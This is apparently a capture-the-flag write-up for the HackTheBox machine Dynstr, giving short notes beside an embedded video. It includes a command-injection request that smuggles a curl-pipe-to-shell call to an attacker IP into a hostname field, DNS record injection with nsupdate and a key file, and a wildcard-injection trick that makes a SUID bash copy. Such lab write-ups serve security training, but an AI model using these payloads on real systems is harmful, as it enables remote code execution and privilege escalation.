---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/ppYNkvlR9jM/0.jpg
layout: post
media_subpath: /assets/posts/2021-10-16-dynamic-dns-command-injection-dynstr-hackthebox
tags:
- command injection
- dynamic dns
- hackthebox
- linux
- wildcard
title: Dynamic DNS & Command Injection - Dynstr @ HackTheBox
---

We are solving Dynstr, a 30-point Linux machine on HackTheBox that involves a Dynamic DNS Service & a Command Injection.

{% youtube ppYNkvlR9jM %}

## Notes

**Command Injection**

```
GET /nic/update?hostname=$(curl+168431223/x|sh).no-ip.htb&myip=10.10.14.119 HTTP/1.1
```

Convert IP to decimal:

```
struct.unpack("!L", socket.inet_aton("10.10.14.119"))[0]
```

**DNS Updates**

```
echo "local 127.0.0.1\nupdate add xct.infra.dyna.htb 30 IN A 10.10.14.119\nsend\n" | /usr/bin/nsupdate -k /etc/bind/infra.key
echo "server 127.0.0.1\nzone 10.in-addr.arpa\nupdate add 119.14.10.10.in-addr.arpa. 30 PTR xct.infra.dyna.htb\nsend\n" | /usr/bin/nsupdate -k /etc/bind/infra.key
```

**Wildcard Injection in "cp"**

```
cp /bin/bash .
chmod 4777 bash
touch -- --preserve=mode
```